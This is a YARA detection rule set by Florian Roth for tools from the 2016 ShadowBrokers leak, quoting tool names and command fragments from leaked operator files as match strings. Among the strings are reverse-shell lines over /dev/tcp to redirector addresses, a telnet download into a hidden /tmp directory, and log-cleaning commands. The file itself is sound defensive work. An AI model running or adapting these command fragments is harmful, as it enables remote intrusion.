
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-12-17
   Identifier: Five Eyes ShadowBroker - Screenshots Extractions
*/

/* Rule Set ----------------------------------------------------------------- */

rule FVEY_ShadowBroker_Auct_Dez16_Strings {
  meta:
     description = "String from the ShodowBroker Files Screenshots - Dec 2016"
     author = "Florian Roth"
     score = 60
     reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
     date = "2016-12-17"
  strings:
    $s1 = "bs.ratload" fullword ascii
    $s2 = "Auditcleaner" fullword ascii
    $s3 = "bll.perlbind" fullword ascii
    $s4 = "bll.perlcallback" fullword ascii
    $s5 = "bll.telnet" fullword ascii
    $s6 = "bll.tnc.gr" fullword ascii
    $s7 = "clean_wtmps.py" fullword ascii
    $s8 = "cmsex.auto" fullword ascii
    $s9 = "cottonaxe" fullword ascii
    $s10 = "dectelnet.sh" fullword ascii
    $s11 = "elatedmonkey" fullword ascii
    $s12 = "electricslide.pl" fullword ascii
    $s13 = "endlessdonut" fullword ascii
    $s14 = "solaris8shellcode" fullword ascii
    $s15 = "solaris9shellcode" fullword ascii
    $s16 = "solaris10shellcode" fullword ascii
    $s17 = "ys.ratload.sh" fullword ascii
    $elf1 = "catflap" fullword ascii
    $elf2 = "charm_penguin" fullword ascii
    $elf3 = "charm_hammer" fullword ascii
    $elf4 = "charm_saver" fullword ascii
    $elf5 = "dampcrowd" fullword ascii
    $elf7 = "dubmoat" fullword ascii
    $elf8 = "ebbshave" fullword ascii
    $elf9 = "eggbasket" fullword ascii
    $elf10 = "toffeehammer" fullword ascii
    $elf11 = "enemyrun" fullword ascii
    $elf12 = "envoytomato" fullword ascii
    $elf13 = "expoxyresin" fullword ascii
    $elf14 = "estopmoonlit" fullword ascii
    $elf15 = "linux-exactchange" fullword ascii
    $elf17 = "ghost_sparc" fullword ascii
    $elf18 = "jackpop" fullword ascii
    $elf19 = "orleans_stride" fullword ascii
    $elf20 = "prokserver" fullword ascii
    $elf21 = "seconddate" fullword ascii
    $elf22 = "shentysdelight" fullword ascii
    $elf23 = "skimcountry" fullword ascii
    $elf24 = "slyheretic" fullword ascii
    $elf25 = "stoicsurgeon" fullword ascii
    $elf26 = "strifeworld" fullword ascii
    $elf27 = "suaveeyeful" fullword ascii
    $elf28 = "suctionchar" fullword ascii
    $elf29 = "vs.attack.linux" fullword ascii
    $pe1 = "charm_razor" fullword ascii wide
    $pe2 = "charm_saver" fullword ascii wide
    $pe3 = "ghost_x86" fullword ascii wide
  condition:
    ( uint16(0) == 0x457f and 1 of ($elf*) ) or
    ( uint16(0) == 0x5a4d and 1 of ($pe*) ) or
    1 of ($s*)
}

rule FVEY_ShadowBroker_violetspirit {
   meta:
      description = "Auto-generated rule - file violetspirit.README"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "a55fec73595f885e43b27963afb17aee8f8eefe811ca027ef0d7721d073e67ea"
   strings:
      $x1 = "-i tgt_ipaddr -h tgt_hostname" fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_gr_gr {
   meta:
      description = "Auto-generated rule - file gr.notes"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "b2b60dce7a4cfdddbd3d3f1825f1885728956bae009de3a307342fbdeeafcb79"
   strings:
      $s4 = "delete starting from: (root) LIST (root)" fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_user_tool_yellowspirit {
   meta:
      description = "Auto-generated rule - file user.tool.yellowspirit.COMMON"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "a7c4b718fa92934a9182567288146ffa3312d9f3edc3872478c90e0e2814078c"
   strings:
      $s1 = "-l 19.16.1.1 -i 10.0.3.1 -n 2222 -r nscd -x 9999" fullword ascii
      $s2 = "-s PITCH_IP -x PITCH_IP -y RHP-24 TARGET_IP" fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_eleganteagle_opscript_1_0_0 {
   meta:
      description = "Auto-generated rule - file eleganteagle_opscript.1.0.0.6"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "57e223318de0a802874642652b3dc766128f25d7e8f320c6f04c6f2659bb4f7f"
   strings:
      $x3 = "uploadnrun -e \"D=-ucIP_ADDRESS_OF_REDIR" ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_opscript {
   meta:
      description = "Auto-generated rule - file opscript.se"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "275c91531a9ac5a240336714093b6aa146b8d7463cb2780cfeeceaea4c789682"
   strings:
      $s1 = "ls -l /tmp) | bdes -k 0x4790cae5ec154ccc|" ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_user_tool_shentysdelight {
   meta:
      description = "Auto-generated rule - file user.tool.shentysdelight.COMMON"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "a564efeaae9c13fe09a27f2d62208a1dec0a19b4a156f5cfa96a0259366b8166"
   strings:
      $s1 = "echo -ne \"/var/run/COLFILE\\0\"" fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_user_tool_epichero {
   meta:
      description = "Auto-generated rule - file user.tool.epichero.COMMON"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "679d194c32cbaead7281df9afd17bca536ee9d28df917b422083ae8ed5b5c484"
   strings:
      $x2 = "-irtun TARGET_IP ISH_CALLBACK_PORT"
      $x3 = "-O REVERSE_SHELL_CALLBACK_PORT -w HIDDEN_DIR" fullword ascii
    condition:
      1 of them
}

rule FVEY_ShadowBroker_user_tool {
   meta:
      description = "Auto-generated rule - file user.tool.elatedmonkey"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "98ae935dd9515529a34478cb82644828d94a2d273816d50485665535454e37cd"
   strings:
      $x5 = "ELATEDMONKEY will only work of apache executes scripts" fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_user_tool_dubmoat {
   meta:
      description = "Auto-generated rule - file user.tool.dubmoat.COMMON"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "bcd4ee336050488f5ffeb850d8eaa11eec34d8ba099b370d94d2c83f08a4d881"
   strings:
      $s1 = "### Verify version on target:" fullword ascii
      $s2 = "/current/bin/ExtractData ./utmp > dub.TARGETNAME" fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_strifeworld {
   meta:
      description = "Auto-generated rule - file strifeworld.1"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "222b00235bf143645ad0d55b2b6839febc5b570e3def00b77699915a7c9cb670"
   strings:
      $s4 = "-p -n.\" strifeworld" fullword ascii
      $s5 = "Running STRIFEWORLD not protected" ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_user_tool_pork {
   meta:
      description = "Auto-generated rule - file user.tool.pork.COMMON"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "9c400aab74e75be8770387d35ca219285e2cedc0c7895225bbe567ce9c9dc078"
   strings:
      $x2 = "packrat -z RAT_REMOTE_NAME" fullword ascii
      $s3 = "./client -t TIME_ADJ SPECIAL_SOURCE_PORT 127.0.0.1 TARG_PORT" ascii
      $s4 = "mkdir TEMP_DIR; cd TEMP_DIR; cat < /dev/tcp/REDIR_IP/RED" ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_user_tool_ebbisland {
   meta:
      description = "Auto-generated rule - file user.tool.ebbisland.COMMON"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "390e776ae15fadad2e3825a5e2e06c4f8de6d71813bef42052c7fd8494146222"
   strings:
      $x1 = "-t 127.0.0.1 -p SERVICE_TCP_PORT -r TARGET_RPC_SERVICE -X"
      $x2 = "-N -A SPECIFIC_SHELLCODE_ADDRESS" fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_user_tool_stoicsurgeon {
   meta:
      description = "Auto-generated rule - file user.tool.stoicsurgeon.COMMON"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "967facb19c9b563eb90d3df6aa89fd7dcfa889b0ba601d3423d9b71b44191f50"
   strings:
      $x1 = "echo -n TARGET_HOSTNAME  | sed '/\\n/!G;s/\\(.\\)\\(.*\\n\\)/&\\2\\1/;//D;s/.//'" fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_user_tool_elgingamble {
   meta:
      description = "Auto-generated rule - file user.tool.elgingamble.COMMON"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "4130284727ddef4610d63bfa8330cdafcb6524d3d2e7e8e0cb34fde8864c8118"
   strings:
      $x2 = "### Local exploit for" fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_README_cup {
   meta:
      description = "Auto-generated rule - file README.cup.NOPEN"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "98aaad31663b89120eb781b25d6f061037aecaeb20cf5e32c36c68f34807e271"
   strings:
      $s3 = "-F file(s)   Full path to target's \"fuser\" program." fullword ascii
      $s4 = "done after the RAT is killed." fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_nopen_oneshot {
   meta:
      description = "Auto-generated rule - file oneshot.example"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "a85b260d6a53ceec63ad5f09e1308b158da31062047dc0e4d562d2683a82bf9a"
   strings:
      $s1 = "/sbin/sh -c (mkdir /tmp/.X11R6; cd /tmp/.X11R6 && telnet" ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_user_tool_earlyshovel {
   meta:
      description = "Auto-generated rule - file user.tool.earlyshovel.COMMON"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "504e7a376c21ffbfb375353c5451dc69a35a10d7e2a5d0358f9ce2df34edf256"
   strings:
      $x1 = "--tip 127.0.0.1 --tport 2525 --cip REDIRECTOR_IP --cport RANDOM_PORT" ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_user_tool_envisioncollision {
   meta:
      description = "Auto-generated rule - file user.tool.envisioncollision.COMMON"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      hash1 = "2f04f078a8f0fdfc864d3d2e37d123f55ecc1d5e401a87eccd0c3846770f9e02"
   strings:
      $x1 = "-i<IP> -p<port> -U<user> -P<password> -D<directory> -c<commands>" fullword ascii
      $x2 = "sh</dev/tcp/REDIR_IP/SHELL_PORT>&0" fullword ascii
      $x3 = "-n ENVISIONCOLLISION" ascii
      $x4 = "-UADMIN -PPASSWORD -i127.0.0.1 -Dipboard" fullword ascii
   condition:
      1 of them
}

/* Super Rules ------------------------------------------------------------- */

rule FVEY_ShadowBroker_Gen_Readme1 {
   meta:
      description = "Auto-generated rule"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      super_rule = 1
      hash1 = "4b236b066ac7b8386a13270dcb7fdff2dda81365d03f53867eb72e29d5e496de"
      hash2 = "64c24bbf42f15dcac04371aef756feabb7330f436c20f33cb25fbc8d0ff014c7"
      hash3 = "a237a2bd6aec429f9941d6de632aeb9729880aa3d5f6f87cf33a76d6caa30619"
   strings:
      $x1 = "ls -latr /tp/med/archive/collect/siemens_msc_isb01/.tmp_ncr/*.MSC | head -10" fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_Gen_Readme2 {
   meta:
      description = "Auto-generated rule - from files user.tool.orleansstride.COMMON, user.tool.curserazor.COMMON"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      super_rule = 1
      hash1 = "18dfd74c3e0bfb1c21127cf3382ba1d9812efdf3e992bd666d513aaf3519f728"
      hash2 = "f4b728c93dba20a163b59b4790f29aed1078706d2c8b07dc7f4e07a6f3ecbe93"
   strings:
      $x1 = "#####  Upload the encrypted phone list as awk, modify each parser command to have the" fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_Gen_Readme3 {
   meta:
      description = "Auto-generated rule"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      super_rule = 1
      hash1 = "18dfd74c3e0bfb1c21127cf3382ba1d9812efdf3e992bd666d513aaf3519f728"
      hash2 = "4b236b066ac7b8386a13270dcb7fdff2dda81365d03f53867eb72e29d5e496de"
      hash3 = "3fe78949a9f3068db953b475177bcad3c76d16169469afd72791b4312f60cfb3"
      hash4 = "64c24bbf42f15dcac04371aef756feabb7330f436c20f33cb25fbc8d0ff014c7"
      hash5 = "a237a2bd6aec429f9941d6de632aeb9729880aa3d5f6f87cf33a76d6caa30619"
      hash6 = "89748906d1c574a75fe030645c7572d7d4145b143025aa74c9b5e2be69df8773"
      hash7 = "f4b728c93dba20a163b59b4790f29aed1078706d2c8b07dc7f4e07a6f3ecbe93"
   strings:
      $s3 = ":%s/CRYPTKEY/CRYPTKEY/g" fullword ascii
   condition:
      1 of them
}

rule FVEY_ShadowBroker_Gen_Readme4 {
   meta:
      description = "Auto-generated rule - from files violetspirit.README, violetspirit.README"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
      date = "2016-12-17"
      super_rule = 1
      hash1 = "a55fec73595f885e43b27963afb17aee8f8eefe811ca027ef0d7721d073e67ea"
      hash2 = "a55fec73595f885e43b27963afb17aee8f8eefe811ca027ef0d7721d073e67ea"
   strings:
      $s1 = "[-v rpc version] : default 4 : Solaris 8 and other patched versions use version 5" fullword ascii
      $s5 = "[-n tcp_port]    : default use portmapper to determine" fullword ascii
   condition:
      1 of them
}
